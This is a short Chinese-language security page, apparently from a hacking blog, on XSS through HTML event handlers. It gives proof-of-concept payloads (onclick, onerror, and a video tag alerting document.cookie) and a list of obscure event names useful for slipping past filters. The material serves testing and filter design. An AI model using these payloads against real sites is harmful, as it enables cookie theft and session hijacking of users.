---
layout: default
---
# ![](../img/hj.jpg)XSS产生事件
事件能让javascript代码运行:
```
<input type=''button'' value=''click me'' onclick=''alert('xss')'' />
<img src=''#'' onerror=alert(/xss/)>
<video src="http://www.youku.com/12544.ogg" onloadedmetadata="alert(document.cookie);"
ondurationchanged="alert(/xss2/);"
ontimeupdate="alert(/xss1/);"
tabindex="0">
</video>
```
可用事件:
```
onResume
onReverse
onSeek
onRowDelete
onRowInserted
onURLFlip
onTimeError
onSynchRestored
onRepeat
onTrackChange
onURLFlip
onRepeate
onMediaComplete
onMediaError
onPause
onProgress
onOutOfSync
oncontrolselect
onlayoutcomplete
onafterprint
onbeforeprint
ondataavailable
ondatasetchanged
ondatasetcomplete
onerrorupdate
onrowenter
onrowexit
onrowsdelete
onrowsinserted
onselectionchange
onbounce
onfinish
onstop
onresizeend
```
__原创文章，转载请注明转载自[http://www.8pwn.com](http://www.8pwn.com)__

[返回上一层](./web)
